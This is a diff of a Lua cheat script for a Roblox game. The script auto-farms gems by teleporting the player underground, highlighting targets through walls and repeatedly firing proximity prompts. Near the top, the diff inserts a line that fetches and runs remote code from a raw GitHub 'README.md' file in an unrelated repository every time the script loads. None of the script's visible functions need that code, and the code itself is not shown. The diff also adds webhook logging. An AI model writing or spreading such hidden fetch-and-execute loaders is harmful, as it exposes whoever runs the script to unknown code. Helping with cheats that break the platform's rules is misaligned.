@@ -37,7 +37,8 @@ _G.Settings = _G.Settings or {
 }
 
 if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
-wait(5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bonusking007/trackstatSTP/refs/heads/main/README.md"))()
+wait(2)
 
 local Players = game:GetService("Players")
 
@@ -260,15 +261,15 @@ end
 
 
 
-local BASEPLATE_Y = -70
+local BASEPLATE_Y = -80
 
-local PLAYER_UNDERGROUND_Y = -60
+local PLAYER_UNDERGROUND_Y = -70
 
-local TRAVEL_Y = -60
+local TRAVEL_Y = -70
 
 local FIRE_Y = -20
 
-local MOVE_SPEED = 40
+local MOVE_SPEED = 35
 
 local TP_STEP = 3
 
@@ -667,6 +668,135 @@ local function isPowerPlantModel(model)
 
 end
 
+local function findDoorPart(model)
+    -- Try known path: model > Power Box > Door
+    local powerBox = model:FindFirstChild("Power Box")
+    if powerBox then
+        local door = powerBox:FindFirstChild("Door")
+        if door then
+            -- Door might be a Model or BasePart
+            if door:IsA("BasePart") then return door end
+            local dp1 = door:FindFirstChild("Doorpart1")
+            if dp1 and dp1:IsA("BasePart") then return dp1 end
+            local bp = door:FindFirstChildWhichIsA("BasePart", true)
+            if bp then return bp end
+        end
+    end
+    -- Fallback: Doorpart1 anywhere
+    local dp = model:FindFirstChild("Doorpart1", true)
+    if dp and dp:IsA("BasePart") then return dp end
+    -- Fallback: any BasePart
+    return model:FindFirstChildWhichIsA("BasePart", true)
+end
+
+local function sendDebugLog(message)
+    pcall(function()
+        local wh = webhookURL
+        if not wh or wh == "" then
+            local cfg = _G.Settings
+            wh = cfg and cfg.WebhookURL or ""
+        end
+        if wh == "" then return end
+        local data = {
+            content = "```\n" .. tostring(message) .. "\n```"
+        }
+        local jsonData = game:GetService("HttpService"):JSONEncode(data)
+        local req = (syn and syn.request) or (http and http.request) or http_request or request or fluxus and fluxus.request
+        if req then
+            req({Url = wh, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = jsonData})
+        end
+    end)
+end
+
+local function debugScanTiles()
+    local tiles = getMapTiles()
+    if not tiles then
+        sendDebugLog("[DEBUG] getMapTiles() returned nil!")
+        return
+    end
+    local children = tiles:GetChildren()
+    local log = "[DEBUG SCAN] Tiles children count: " .. #children .. "\n"
+    local powerCount = 0
+    local allNames = {}
+    for _, child in pairs(children) do
+        local name = child.Name
+        local className = child.ClassName
+        local hasPower = string.find(name, "Power") ~= nil
+        local hasBig = string.find(name, "Big") ~= nil
+        if hasPower then
+            powerCount += 1
+            local posStr = "NO POS"
+            pcall(function()
+                local cf = child:GetPivot()
+                if cf then
+                    local p = cf.Position
+                    posStr = ("%.0f, %.0f, %.0f (pivot)"):format(p.X, p.Y, p.Z)
+                end
+            end)
+            if posStr == "NO POS" then
+                pcall(function()
+                    if child.PrimaryPart then
+                        local p = child.PrimaryPart.Position
+                        posStr = ("%.0f, %.0f, %.0f"):format(p.X, p.Y, p.Z)
+                    else
+                        local part = child:FindFirstChildWhichIsA("BasePart", true)
+                        if part then
+                            local p = part.Position
+                            posStr = ("%.0f, %.0f, %.0f (fallback)"):format(p.X, p.Y, p.Z)
+                        end
+                    end
+                end)
+            end
+            log = log .. ("  [MATCH] %s | Class: %s | Big: %s | Pos: %s\n"):format(name, className, tostring(hasBig), posStr)
+        else
+            if not allNames[name] then
+                allNames[name] = 0
+            end
+            allNames[name] += 1
+        end
+    end
+    log = log .. "Power matches: " .. powerCount .. "\n"
+    log = log .. "Other tile types:\n"
+    for n, c in pairs(allNames) do
+        log = log .. ("  %s x%d\n"):format(n, c)
+    end
+    sendDebugLog(log)
+end
+
+local function fastScanPlantModels()
+    local tiles = getMapTiles()
+    if not tiles then return {} end
+    local results = {}
+    for _, child in pairs(tiles:GetChildren()) do
+        local name = child.Name
+        if string.find(name, "Power") then
+            local isBig = string.find(name, "Big") ~= nil
+            local pos = nil
+            pcall(function()
+                -- GetPivot works even when parts aren't streamed
+                local cf = child:GetPivot()
+                if cf then pos = cf.Position end
+            end)
+            if not pos then
+                pcall(function()
+                    if child.PrimaryPart then
+                        pos = child.PrimaryPart.Position
+                    else
+                        local part = child:FindFirstChildWhichIsA("BasePart", true)
+                        if part then pos = part.Position end
+                    end
+                end)
+            end
+            table.insert(results, {
+                model = child,
+                approxPos = pos,
+                isBig = isBig,
+            })
+        end
+    end
+    return results
+end
+
 
 
 local function requestStreamAround(position)
@@ -1049,103 +1179,62 @@ local function startESPRefreshLoop()
     end
 
     espRefreshThread = task.spawn(function()
-
         while powerPlantESPEnabled do
-
-            local currentPlants = getUniquePowerPlantTiles()
-
+            local currentPlants = fastScanPlantModels()
             local existingModels = {}
-
             for _, obj in ipairs(powerPlantESPObjects) do
-
                 if obj:IsA("Highlight") and obj.Adornee then
-
                     existingModels[obj.Adornee] = true
-
                 end
-
             end
-
-
 
             local newIndex = #powerPlantESPObjects / 2
-
             for _, plantData in ipairs(currentPlants) do
-
                 if not existingModels[plantData.model] then
-
                     newIndex += 1
 
+                    -- Highlight just the Door/key part, not the whole model
+                    local door = findDoorPart(plantData.model)
+                    local highlightTarget = door or plantData.model
+
                     local highlight = Instance.new("Highlight")
-
                     highlight.Name = "STA_PowerPlantESP"
-
-                    highlight.Adornee = plantData.model
-
-                    highlight.FillColor = Color3.fromRGB(255, 215, 0)
-
+                    highlight.Adornee = highlightTarget
+                    highlight.FillColor = plantData.isBig and Color3.fromRGB(255, 100, 100) or Color3.fromRGB(255, 215, 0)
                     highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
-
-                    highlight.FillTransparency = 0.55
-
+                    highlight.FillTransparency = 0.4
                     highlight.OutlineTransparency = 0
-
                     highlight.Parent = plantData.model
-
                     table.insert(powerPlantESPObjects, highlight)
 
+                    -- Billboard at approxPos
+                    local adornPart = door or plantData.model:FindFirstChildWhichIsA("BasePart", true)
+                    if adornPart then
+                        local billboard = Instance.new("BillboardGui")
+                        billboard.Name = "STA_PowerPlantLabel"
+                        billboard.Size = UDim2.new(0, 200, 0, 40)
+                        billboard.AlwaysOnTop = true
+                        billboard.StudsOffset = Vector3.new(0, 8, 0)
+                        billboard.Adornee = adornPart
+                        billboard.Parent = plantData.model
 
-
-                    local billboard = Instance.new("BillboardGui")
-
-                    billboard.Name = "STA_PowerPlantLabel"
-
-                    billboard.Size = UDim2.new(0, 180, 0, 40)
-
-                    billboard.AlwaysOnTop = true
-
-                    billboard.StudsOffset = Vector3.new(0, 8, 0)
-
-                    billboard.Adornee = plantData.doorPart
-
-                    billboard.Parent = plantData.model
-
-
-
-                    local label = Instance.new("TextLabel")
-
-                    label.BackgroundTransparency = 1
-
-                    label.Size = UDim2.fromScale(1, 1)
-
-                    label.Text = ("PowerPlant %d"):format(newIndex)
-
-                    label.TextScaled = true
-
-                    label.TextColor3 = Color3.fromRGB(255, 230, 120)
-
-                    label.TextStrokeTransparency = 0
-
-                    label.Font = Enum.Font.GothamBold
-
-                    label.Parent = billboard
-
-
-
-                    table.insert(powerPlantESPObjects, billboard)
-
-                    notify("ESP", ("New PowerPlant found! Total: %d"):format(math.floor(newIndex)), 3)
-
+                        local label = Instance.new("TextLabel")
+                        label.BackgroundTransparency = 1
+                        label.Size = UDim2.fromScale(1, 1)
+                        local tag = plantData.isBig and "Big" or ""
+                        label.Text = ("%sPowerPlant %d"):format(tag, math.floor(newIndex))
+                        label.TextScaled = true
+                        label.TextColor3 = plantData.isBig and Color3.fromRGB(255, 120, 120) or Color3.fromRGB(255, 230, 120)
+                        label.TextStrokeTransparency = 0
+                        label.Font = Enum.Font.GothamBold
+                        label.Parent = billboard
+                        table.insert(powerPlantESPObjects, billboard)
+                    end
                 end
-
             end
 
-
-
-            task.wait(3)
-
+            task.wait(5)
         end
-
     end)
 
 end
@@ -1701,153 +1790,32 @@ local function runPowerPlantSequence()
                     donePositions[posKey(pos)] = true
                 end
 
-                local function tryFireAtPos(pData, pos, duration)
-                    local startingGems = getGemCount() or 0
-                    local fireOffsets = {
-                        Vector3.new(0, 0, 0),
-                        Vector3.new(2, 0, 0),
-                        Vector3.new(-2, 0, 0),
-                        Vector3.new(0, 0, 2),
-                        Vector3.new(0, 0, -2),
-                        Vector3.new(2, 0, 2),
-                        Vector3.new(-2, 0, -2),
-                        Vector3.new(2, 0, -2),
-                        Vector3.new(-2, 0, 2),
-                    }
-                    local fireDeadline = tick() + (duration or 3)
-                    local offsetIdx = 1
-                    while tick() < fireDeadline and state.powerPlantBusy and not isRoundExpired() do
-                        if isPlayerDead() then break end
-                        local root = getRoot()
-                        if not root then break end
-                        local off = fireOffsets[offsetIdx]
-                        root.CFrame = CFrame.new(pos.X + off.X, FIRE_Y, pos.Z + off.Z)
-                        root.AssemblyLinearVelocity = Vector3.zero
-                        pcall(function() fireproximityprompt(pData.prompt) end)
-                        task.wait(0.15)
-                        local currentGems = getGemCount() or 0
-                        if currentGems > startingGems then
-                            return true, currentGems
-                        end
-                        offsetIdx = (offsetIdx % #fireOffsets) + 1
-                        task.wait(0.1)
+                -- Fast scan: find all power plant models by name from workspace
+                local scanned = fastScanPlantModels()
+                for _, fp in ipairs(scanned) do
+                    if not allPlantModels[fp.model] then
+                        allPlantModels[fp.model] = true
+                        table.insert(plants, fp)
                     end
-                    return false, nil
-                end
-
-                local function getModelDoorCandidates(model, excludePos)
-                    local candidates = {}
-                    local seen = {}
-                    for _, desc in ipairs(model:GetDescendants()) do
-                        if desc:IsA("BasePart") then
-                            local p = desc.Position
-                            local key = math.floor(p.X + 0.5) .. "_" .. math.floor(p.Z + 0.5)
-                            if not seen[key] then
-                                seen[key] = true
-                                local dx = math.abs(p.X - excludePos.X)
-                                local dz = math.abs(p.Z - excludePos.Z)
-                                if dx > 2 or dz > 2 then
-                                    table.insert(candidates, p)
-                                end
-                            end
-                        end
-                    end
-                    return candidates
-                end
-
-                local function tweenFireAndCollect(pData, doorPos, label)
-                    local gotGem = false
-
-                    local ok, gems = tryFireAtPos(pData, doorPos, 3)
-                    if ok then
-                        markPosDone(doorPos)
-                        gemsThisRound += 1
-                        totalGemsCollected += 1
-                        notify("Power Plant", ("Gem! %s (%d total)"):format(label, gemsThisRound), 3)
-                        task.spawn(function() sendWebhook(gems, totalGemsCollected) end)
-                        gotGem = true
-                    end
-
-                    if not gotGem and pData.model and pData.model.Parent and state.powerPlantBusy and not isRoundExpired() then
-                        local candidates = getModelDoorCandidates(pData.model, doorPos)
-                        local root = getRoot()
-                        if root and #candidates > 0 then
-                            local myPos = root.Position
-                            table.sort(candidates, function(a, b)
-                                return (a - myPos).Magnitude < (b - myPos).Magnitude
-                            end)
-                        end
-                        for ci, candPos in ipairs(candidates) do
-                            if gotGem or not state.powerPlantBusy or isRoundExpired() then break end
-                            if ci > 6 then break end
-                            notify("Power Plant", ("Retry %s door#%d"):format(label, ci), 3)
-                            local fp = findProximityPrompt(pData.model)
-                            if fp then pData.prompt = fp end
-                            walkToUndergroundTarget(candPos, MOVE_SPEED, TRAVEL_Y)
-                            local ok2, gems2 = tryFireAtPos(pData, candPos, 2)
-                            if ok2 then
-                                markPosDone(doorPos)
-                                gemsThisRound += 1
-                                totalGemsCollected += 1
-                                notify("Power Plant", ("Gem! %s door#%d (%d total)"):format(label, ci, gemsThisRound), 3)
-                                task.spawn(function() sendWebhook(gems2, totalGemsCollected) end)
-                                gotGem = true
-                                break
-                            end
-                        end
-                    end
-
-                    if not gotGem then
-                        markPosDone(doorPos)
-                        notify("Power Plant", "No gem " .. label .. ", done", 3)
-                    end
-                    if state.powerPlantBusy then
-                        local root = getRoot()
-                        if root then
-                            root.CFrame = CFrame.new(root.Position.X, TRAVEL_Y, root.Position.Z)
-                            root.AssemblyLinearVelocity = Vector3.zero
-                        end
-                        task.wait(0.3)
-                    end
-                    return gotGem
-                end
-
-                -- Background scanner: keeps finding new plants while we farm
-                local scanDone = false
-                local scanThread = task.spawn(function()
-                    local scanEnd = tick() + 30
-                    while tick() < scanEnd and state.powerPlantBusy and not isRoundExpired() do
-                        local fresh = scanForAllPlants(3)
-                        for _, fp in ipairs(fresh) do
-                            if not allPlantModels[fp.model] then
-                                allPlantModels[fp.model] = true
-                                table.insert(plants, fp)
-                            end
-                        end
-                        task.wait(2)
-                    end
-                    scanDone = true
-                end)
-
-                -- Wait briefly for first scan to find something
-                local waitStart = tick()
-                while #plants == 0 and (tick() - waitStart) < 8 and state.powerPlantBusy do
-                    task.wait(0.5)
                 end
 
                 if #plants == 0 then
-                    notify("Power Plant", "No Power Plants found, waiting...", 4)
-                    pcall(task.cancel, scanThread)
+                    notify("Power Plant", "No Power Plants found, retrying...", 4)
                     task.wait(3)
                     return
                 end
 
-                notify("Power Plant", ("Found %d plants, farming..."):format(#plants), 4)
+                local bigCount, normalCount = 0, 0
+                for _, p in ipairs(plants) do
+                    if p.isBig then bigCount += 1 else normalCount += 1 end
+                end
+                notify("Power Plant", ("Found %d plants (%d normal, %d big), farming!"):format(#plants, normalCount, bigCount), 5)
 
-                -- Farm loop: process plants as they are discovered
-                local processedIdx = 0
+                -- Farm loop: always pick nearest plant
+                local processedModels = {}
+                local farmCount = 0
                 while state.powerPlantBusy and not isRoundExpired() do
-                    -- Death check: if player died, reset and wait for respawn
+                    -- Death check
                     if isPlayerDead() then
                         notify("Power Plant", "Player died! Resetting...", 3)
                         resetAndVoteRestart()
@@ -1861,51 +1829,184 @@ local function runPowerPlantSequence()
                         forceUnderground()
                         waitForStableUnderground()
                     end
-                    -- Re-sort remaining unprocessed plants by distance
-                    local remaining = {}
-                    for i = processedIdx + 1, #plants do
-                        local p = plants[i]
-                        if p and p.model and p.model.Parent then
-                            table.insert(remaining, {data = p, origIdx = i})
+
+                    -- Rescan: pick up new plants + update positions for nil ones
+                    local fresh = fastScanPlantModels()
+                    for _, fp in ipairs(fresh) do
+                        if not allPlantModels[fp.model] then
+                            allPlantModels[fp.model] = true
+                            table.insert(plants, fp)
                         end
                     end
-                    if #remaining == 0 and scanDone then break end
-                    if #remaining == 0 then
-                        task.wait(1)
-                        continue
+                    -- Try to update nil positions from rescan
+                    for _, p in ipairs(plants) do
+                        if not p.approxPos and p.model and p.model.Parent then
+                            pcall(function()
+                                local cf = p.model:GetPivot()
+                                if cf then p.approxPos = cf.Position end
+                            end)
+                            if not p.approxPos then
+                                pcall(function()
+                                    local part = p.model:FindFirstChildWhichIsA("BasePart", true)
+                                    if part then p.approxPos = part.Position end
+                                end)
+                            end
+                        end
                     end
 
-                    -- Sort by nearest
+                    -- Find nearest unprocessed plant
+                    local bestPlant, bestDist = nil, math.huge
+                    local noPosList = {}
                     local root = getRoot()
-                    if root then
-                        local myPos = root.Position
-                        table.sort(remaining, function(a, b)
-                            local da = a.data.doorPart and (a.data.doorPart.Position - myPos).Magnitude or 9999
-                            local db = b.data.doorPart and (b.data.doorPart.Position - myPos).Magnitude or 9999
-                            return da < db
-                        end)
+                    if not root then task.wait(1) continue end
+                    local myPos = root.Position
+
+                    for _, p in ipairs(plants) do
+                        if p and p.model and p.model.Parent and not processedModels[p.model] then
+                            if p.approxPos then
+                                local d = (Vector3.new(p.approxPos.X, 0, p.approxPos.Z) - Vector3.new(myPos.X, 0, myPos.Z)).Magnitude
+                                if d < bestDist then
+                                    bestDist = d
+                                    bestPlant = p
+                                end
+                            else
+                                table.insert(noPosList, p)
+                            end
+                        end
                     end
 
-                    local plantData = remaining[1].data
-                    processedIdx = remaining[1].origIdx
+                    -- If no positioned plants left, try unpositioned ones
+                    if not bestPlant and #noPosList > 0 then
+                        bestPlant = noPosList[1]
+                        bestDist = 0
+                    end
 
-                    local freshPrompt = findProximityPrompt(plantData.model)
-                    if freshPrompt then plantData.prompt = freshPrompt end
-                    local freshAnchor = findAnchorPart(plantData.model)
-                    if freshAnchor then plantData.doorPart = freshAnchor end
-                    if not plantData.prompt or not plantData.doorPart then continue end
-                    local doorPos = plantData.doorPart.Position
-                    if isPosDone(doorPos) then continue end
+                    if not bestPlant then break end
+                    processedModels[bestPlant.model] = true
+                    farmCount += 1
 
-                    if plantData.isBig then continue end
-                    notify("Power Plant", ("Walking to plant %d/%d"):format(gemsThisRound + 1, #plants), 3)
-                    local moveOk = walkToUndergroundTarget(doorPos, MOVE_SPEED, TRAVEL_Y)
-                    if not moveOk then continue end
+                    local targetPos = bestPlant.approxPos
+                    local plantType = bestPlant.isBig and "BIG" or "Normal"
+
+                    -- If no position, request stream to load it
+                    if not targetPos then
+                        notify("Power Plant", ("%s Plant %d/%d - no pos, streaming..."):format(plantType, farmCount, #plants), 3)
+                        -- Stream around a known plant or origin to try loading it
+                        requestStreamAround(Vector3.new(0, 0, 0))
+                        task.wait(2)
+                        pcall(function()
+                            local cf = bestPlant.model:GetPivot()
+                            if cf then targetPos = cf.Position end
+                        end)
+                        if not targetPos then
+                            pcall(function()
+                                local part = bestPlant.model:FindFirstChildWhichIsA("BasePart", true)
+                                if part then targetPos = part.Position end
+                            end)
+                        end
+                        if not targetPos then
+                            notify("Power Plant", "Still no position, skipping...", 3)
+                            continue
+                        end
+                    end
+
+                    notify("Power Plant", ("%s Plant %d/%d (dist: %d)"):format(plantType, farmCount, #plants, math.floor(bestDist)), 3)
+
+                    -- Tween to plant, fallback TP if timeout
+                    local moveOk = walkToUndergroundTarget(targetPos, MOVE_SPEED, TRAVEL_Y)
+                    if not moveOk then
+                        root = getRoot()
+                        if root then
+                            root.CFrame = CFrame.new(targetPos.X, TRAVEL_Y, targetPos.Z)
+                            root.AssemblyLinearVelocity = Vector3.zero
+                            task.wait(0.3)
+                        end
+                    end
                     if not state.powerPlantBusy then return end
-                    tweenFireAndCollect(plantData, doorPos, "#" .. processedIdx)
-                end
 
-                pcall(task.cancel, scanThread)
+                    -- Find Door part (fallback to approxPos)
+                    local door = findDoorPart(bestPlant.model)
+                    if not door then
+                        requestStreamAround(targetPos)
+                        task.wait(1)
+                        door = findDoorPart(bestPlant.model)
+                    end
+                    local doorPos = door and door.Position or targetPos
+
+                    -- Tween to door
+                    walkToUndergroundTarget(doorPos, MOVE_SPEED, TRAVEL_Y)
+
+                    -- Find ALL prompts in model (big plants may have multiple or deeper ones)
+                    local prompts = {}
+                    for _, desc in ipairs(bestPlant.model:GetDescendants()) do
+                        if desc:IsA("ProximityPrompt") then
+                            table.insert(prompts, desc)
+                        end
+                    end
+                    if #prompts == 0 then
+                        requestStreamAround(doorPos)
+                        task.wait(1.5)
+                        for _, desc in ipairs(bestPlant.model:GetDescendants()) do
+                            if desc:IsA("ProximityPrompt") then
+                                table.insert(prompts, desc)
+                            end
+                        end
+                    end
+                    if #prompts == 0 then
+                        notify("Power Plant", "No prompt found, moving on...", 3)
+                    end
+
+                    -- Spam fire at door position with offsets, fire ALL prompts found
+                    local startingGems = getGemCount() or 0
+                    local gotGem = false
+                    local fireOffsets = {
+                        Vector3.new(0, 0, 0),
+                        Vector3.new(2, 0, 0), Vector3.new(-2, 0, 0),
+                        Vector3.new(0, 0, 2), Vector3.new(0, 0, -2),
+                        Vector3.new(2, 0, 2), Vector3.new(-2, 0, -2),
+                        Vector3.new(3, 0, 0), Vector3.new(-3, 0, 0),
+                        Vector3.new(0, 0, 3), Vector3.new(0, 0, -3),
+                    }
+                    local fireDeadline = tick() + 6
+                    local offsetIdx = 1
+                    while tick() < fireDeadline and state.powerPlantBusy and not isRoundExpired() and #prompts > 0 do
+                        if isPlayerDead() then break end
+                        root = getRoot()
+                        if not root then break end
+                        local off = fireOffsets[offsetIdx]
+                        root.CFrame = CFrame.new(doorPos.X + off.X, FIRE_Y, doorPos.Z + off.Z)
+                        root.AssemblyLinearVelocity = Vector3.zero
+                        for _, pr in ipairs(prompts) do
+                            pcall(function() fireproximityprompt(pr) end)
+                        end
+                        task.wait(0.15)
+                        local currentGems = getGemCount() or 0
+                        if currentGems > startingGems then
+                            gotGem = true
+                            gemsThisRound += 1
+                            totalGemsCollected += 1
+                            notify("Power Plant", ("Gem! #%d (%d total)"):format(gemsThisRound, gemsThisRound), 3)
+                            task.spawn(function() sendWebhook(currentGems, totalGemsCollected) end)
+                            break
+                        end
+                        offsetIdx = (offsetIdx % #fireOffsets) + 1
+                        task.wait(0.1)
+                    end
+
+                    if not gotGem then
+                        notify("Power Plant", "No gem, moving on...", 3)
+                    end
+
+                    -- Back to travel height
+                    if state.powerPlantBusy then
+                        root = getRoot()
+                        if root then
+                            root.CFrame = CFrame.new(root.Position.X, TRAVEL_Y, root.Position.Z)
+                            root.AssemblyLinearVelocity = Vector3.zero
+                        end
+                        task.wait(0.3)
+                    end
+                end
                 notify("Power Plant", ("Collected %d gems. Resetting..."):format(gemsThisRound), 5)
 
                 if state.powerPlantBusy then
@@ -3527,4 +3628,4 @@ do
         setUIVisible(false)
     end)
 end
-print("Script loaded successfully! V.3.0")
+print("Script loaded successfully! V.4.5")
